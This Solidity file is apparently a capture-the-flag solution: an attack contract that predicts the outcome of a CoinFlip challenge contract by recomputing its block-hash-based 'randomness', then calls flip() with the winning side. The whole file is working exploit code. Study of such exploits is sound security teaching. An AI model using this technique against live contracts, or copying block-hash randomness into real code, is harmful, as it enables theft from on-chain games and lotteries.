// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./CoinFlip.sol";

contract CoinFlipAttack is Ownable {
    CoinFlip public coinFlip;

    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address addr) {
        coinFlip = CoinFlip(addr);
    }

    function attack() external onlyOwner {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flip = blockValue / FACTOR;
        bool side = flip == 1 ? true : false;

        coinFlip.flip(side);
    }
}
